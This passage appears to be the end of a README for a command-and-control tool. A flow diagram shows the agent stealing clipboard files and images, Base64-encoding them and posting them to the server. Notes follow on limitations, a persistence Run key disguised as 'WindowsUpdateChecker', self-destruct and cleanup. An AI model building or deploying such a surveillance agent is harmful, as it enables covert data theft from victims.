                    ├─ CF_HDROP       → Read file → Base64 → POST (file) ← log CLIPBOARD
                    └─ CF_DIB         → DibToBmp → Base64 → POST (image) ← log CLIPBOARD

C2 Heartbeat Monitor [background, every 5s]
    └─ last_seen > 10s → status="dead" → update DB → log DEAD → Red notification
```

---

## 8. Security Notes

This tool is intended **only** for use in authorized environments (penetration testing, red team exercises, security research).

**Known limitations:**

| Limitation | Detail |
|------------|--------|
| HTTP plain text | Vulnerable to MITM — HTTPS/TLS can be added for production use |
| Self-destruct | `ShellExecuteA + .bat` method is unreliable on Win10/11 |
| Polling delay | Command delivery delayed up to 3s |
| File limit | Files larger than 50 MB are truncated |
| One-way commands | Only kill / persist — by design |
| Log files | `logs/` directory must be manually wiped after operations |

**Cleanup:**

```
Agent side:
  kill command    → registry + Run key + EXE deleted
  Persistence     → reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateChecker /f

C2 side:
  Delete single agent   → Agent Menu → [4]
  Full wipe             → Main Menu → [D] → [1] → Confirm
  Log files             → manually delete C2/logs/ directory
  Agent EXE             → manually delete C2/agents/bingo.exe
```
